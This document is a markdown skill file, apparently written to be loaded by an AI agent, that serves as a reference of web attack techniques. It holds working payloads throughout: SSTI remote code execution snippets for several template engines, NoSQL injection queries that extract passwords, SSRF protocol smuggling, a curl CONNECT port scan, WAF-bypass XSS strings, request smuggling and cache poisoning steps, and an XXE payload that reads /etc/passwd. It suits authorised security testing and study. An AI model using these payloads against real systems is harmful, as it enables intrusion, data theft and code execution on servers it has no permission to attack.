---
name: web-hacking
description: >
  Advanced web application attack techniques from PortSwigger's Top 10 (2025).
  Covers SSTI (error-based/blind/polyglot), ORM injection and data leaking,
  advanced SSRF (redirect loops, HTTP/2 CONNECT, protocol smuggling, DNS rebinding),
  Unicode normalization WAF bypasses, cache poisoning (Next.js, web cache deception),
  parser differentials (content-type confusion, request smuggling, URL parsing),
  XS-Leaks (ETag, connection pool timing), and SOAP/WSDL exploitation.
  Load this technique when testing web applications for injection, SSRF, cache,
  or filter bypass vulnerabilities.
---

# Web Hacking Techniques Reference

## Server-Side Template Injection (SSTI)

### What It Is
SSTI occurs when user input is embedded into server-side templates without sanitization. Error-based SSTI exploits template engine error messages to detect and extract data even when output is not directly reflected.

### Detection Signals
- Reflected input in error messages or rendered pages
- Math expressions evaluated in responses (e.g., input `{{7*7}}` → output `49`)
- Template syntax errors in response bodies or 500 error pages
- Different error messages for valid vs invalid template syntax

### Polyglot Detection Payloads
Try these in order — each targets multiple template engines simultaneously:
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
{{7*'7'}}
```

If `49` or `7777777` appears in the response (including error messages), the engine is evaluating input.

### Engine Identification
- **Jinja2** (Python): `{{7*7}}` → `49`, `{{config}}` leaks config, `{{self.__class__}}`
- **Twig** (PHP): `{{7*7}}` → `49`, `{{_self.env.getFilter('id')}}` for RCE
- **Freemarker** (Java): `${7*7}` → `49`, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Pebble** (Java): `{{7*7}}` → `49`, `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').getMethod('exec',...) %}`
- **Velocity** (Java): `#set($x=7*7)$x` → `49`
- **ERB** (Ruby): `<%= 7*7 %>` → `49`, `<%= system('id') %>`

### Blind / Error-Based Exploitation
When output is not reflected but errors are visible:
1. Trigger distinct errors with valid vs invalid syntax to confirm injection
2. Use conditional expressions: `{{7*7 if True else error}}` — observe error vs no-error
3. Extract data character by character via error oracles
4. Use time-based payloads: `{{range(999999999)|join}}` to cause delays

## ORM Injection / Data Leaking

### What It Is
ORM injection exploits search/filter functionality to extract data field-by-field through boolean or error-based oracles, without needing raw SQL injection.

### Detection Signals
- Search or filter endpoints accepting field-based query parameters
- APIs that return different responses for matching vs non-matching queries
- Error messages revealing ORM/model field names

### MongoDB / NoSQL Filter Manipulation
```
GET /api/users?username[$gt]=
GET /api/users?username[$regex]=^a
GET /api/users?password[$gt]=
GET /api/users?username[$ne]=invalid&password[$ne]=invalid
GET /api/users?username[$in][]=admin&password[$gt]=
```

### Relational ORM Filter Abuse (Django, Rails, etc.)
```
GET /api/users?username__contains=admin
GET /api/users?username__startswith=a
GET /api/users?password__startswith=a
GET /api/users?email__regex=.*
GET /api/users?order_by=password
```

### Boolean-Based Data Extraction
1. Confirm filter works: `?field[$regex]=^a` returns results, `?field[$regex]=^zzz` does not
2. Extract first character: try `^a`, `^b`, ..., `^z` — the one returning results is correct
3. Continue: `^aA`, `^aB`, ... to extract full value character by character
4. Automate with a script that binary-searches each character position

## Advanced SSRF

### Redirect Loop Technique
Convert blind SSRF into visible responses by chaining HTTP redirects:
1. Set up an external server that redirects to the internal target
2. Send the SSRF payload pointing to your redirect server
3. The application follows the redirect to the internal resource
4. If the app returns the redirect target's response, blind SSRF becomes visible
5. Chain multiple redirects to bypass allowlist checks that only validate the first hop

### HTTP/2 CONNECT for Internal Port Scanning
When the target supports HTTP/2:
1. Use HTTP/2 CONNECT method to request a tunnel to internal hosts
2. Different error responses (connection refused vs timeout vs success) reveal port status
3. Bypass traditional SSRF filters that only inspect HTTP/1.1 request URLs
```
curl --http2 -X CONNECT internal-host:6379 https://target/
```

### Protocol Smuggling
- `gopher://internal:port/_<raw-tcp-data>` — send raw TCP data to internal services
- `dict://internal:port/info` — interact with Redis, memcached
- `file:///etc/passwd` — local file read if file:// is allowed
- `tftp://attacker/file` — may bypass URL scheme restrictions

### DNS Rebinding
1. Set up a DNS record with short TTL pointing to attacker IP
2. Application resolves and validates — passes allowlist check
3. On second resolution (when making the actual request), DNS returns internal IP
4. Application connects to internal resource thinking it's the allowed host

## Unicode Normalization Attacks

### What It Is
WAFs and input filters often check raw byte input, but the application may normalize Unicode characters before processing. Characters that look different at the byte level can normalize to the same ASCII equivalent.

### Normalization Forms
- **NFC** (Canonical Decomposition + Canonical Composition)
- **NFD** (Canonical Decomposition)
- **NFKC** (Compatibility Decomposition + Canonical Composition) — most aggressive, collapses many Unicode → ASCII
- **NFKD** (Compatibility Decomposition)

### WAF Bypass Examples
Path traversal through Unicode:
```
..%c0%af..%c0%af  →  ../../  (overlong UTF-8)
..／..／          →  ../../  (fullwidth solidus U+FF0F)
```

XSS filter bypass:
```
＜script＞alert(1)＜/script＞    (fullwidth angle brackets U+FF1C, U+FF1E)
<scrıpt>alert(1)</scrıpt>      (dotless i U+0131, may bypass case-insensitive filters)
```

SSRF filter bypass:
```
ⓛⓞⓒⓐⓛⓗⓞⓢⓣ  →  localhost  (circled letters normalize via NFKC)
ⓘⓝⓣⓔⓡⓝⓐⓛ   →  internal
```

Homoglyph substitution:
```
аdmin  (Cyrillic 'а' U+0430 vs Latin 'a' U+0061)
pаypal.com  (visually identical but different domain)
```

### Testing Methodology
1. Identify where input is filtered/validated vs where it's consumed
2. Test if the application normalizes Unicode (send fullwidth chars and check response)
3. If normalization occurs after validation, craft payloads using Unicode equivalents
4. Common targets: URL paths, query parameters, HTTP headers, form fields

## Cache Poisoning

### Next.js Internal Cache Poisoning
Next.js uses an internal fetch cache that can be manipulated:
1. Identify cached routes (static pages, ISR pages, API routes with revalidation)
2. Inject unkeyed inputs (headers, cookies) that affect the response but aren't part of the cache key
3. Poison the cache so all subsequent visitors receive the attacker's payload
4. Key headers to test: `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Middleware-Prefetch`

### Web Cache Deception
Trick the cache into storing sensitive responses:
1. Find authenticated pages with personal data (e.g., `/account/settings`)
2. Append a static extension: `/account/settings/nonexistent.css`
3. If the origin returns the authenticated page and the cache stores it (treating `.css` as cacheable), any visitor can retrieve the cached response
4. Variations: `/account/settings%2F..%2Fstatic.js`, path confusion payloads

### Cache Key Manipulation
- Unkeyed headers: `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`
- Unkeyed cookies: language/locale cookies that change response content
- Unkeyed query params: some caches exclude certain parameters (utm_*, fbclid)
- Fat GET requests: some caches key on URL only but the origin reads the body

## Parser Differentials

### What It Is
Different components in the request pipeline (proxy, WAF, application server, framework) may parse the same input differently. Exploiting these inconsistencies can bypass security controls.

### Content-Type Confusion
```
Content-Type: application/json  →  backend parses as JSON
Content-Type: application/x-www-form-urlencoded  →  WAF parses as form data
```
Send JSON body with form Content-Type — WAF checks form params, backend reads JSON.

### Multipart Boundary Tricks
```
Content-Type: multipart/form-data; boundary=abc; boundary=xyz
```
Some parsers use the first boundary, others use the last — inject payloads visible to one but not the other.

### Chunked Encoding Edge Cases
```
Transfer-Encoding: chunked
Transfer-Encoding: identity
```
HTTP request smuggling via conflicting Transfer-Encoding / Content-Length headers. Frontend uses one, backend uses the other.

### JSON/XML Parsing Discrepancies
- Duplicate keys: `{"user":"normal","user":"admin"}` — some parsers take first, others take last
- Comments: `{"user":"admin"/* comment */}` — some JSON parsers accept comments, others don't
- Unicode escapes: `\u0061dmin` → `admin` — may bypass keyword filters
- Truncation: overlong strings may be truncated differently by different parsers

### URL Parsing Inconsistencies
```
https://evil.com@target.com/  →  some parsers read host as evil.com, others as target.com
https://target.com\@evil.com/ →  backslash treated as path separator by some
```

## XS-Leaks (Cross-Site Leaks)

### What It Is
XS-Leaks exploit browser side-channels to infer cross-origin information. The attacker page observes timing, error states, or resource properties to deduce server responses.

### ETag Length Leak
1. Load a cross-origin resource (e.g., via `<img>` or `fetch`)
2. Observe the ETag header value — its length correlates with response size
3. Different response sizes for different inputs → oracle for cross-origin data
4. Use to detect: authentication state, search result counts, personal data presence

### Connection Pool Timing Oracle
1. Browser maintains a limited connection pool per origin (~6 connections for HTTP/1.1)
2. Saturate the pool with pending requests to the target
3. Time how long a new request takes — if the target redirects, the connection frees faster
4. Use timing difference to detect cross-origin redirects (e.g., login redirects)

### Other XS-Leak Techniques
- **Frame counting**: `window.frames.length` differs based on cross-origin content
- **Error-based oracles**: different error types for existing vs non-existing resources
- **postMessage leaks**: messages sent by cross-origin frames may leak data
- **Cache timing**: cached vs uncached responses have different load times
- **History length**: `history.length` changes after cross-origin navigations

## SOAP/WSDL Exploitation

### What It Is
.NET's `HttpWebClientProtocol` can be abused when an application dynamically loads WSDL definitions from attacker-controlled URLs, leading to SSRF or RCE.

### WSDL Injection
1. Identify endpoints that accept WSDL URLs or dynamically load web service definitions
2. Point the WSDL URL to an attacker-controlled server
3. Craft a malicious WSDL that triggers:
   - SSRF: WSDL `<import>` or `<include>` fetching internal resources
   - XXE: XML parsing of the WSDL document
   - RCE: code generation from malicious type definitions

### XXE via SOAP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <request>&xxe;</request>
  </soap:Body>
</soap:Envelope>
```

### .NET Deserialization via SOAP
- BinaryFormatter, ObjectStateFormatter, LosFormatter payloads in SOAP body
- ViewState deserialization when MAC validation is disabled
- Use ysoserial.net to generate .NET deserialization gadget chains
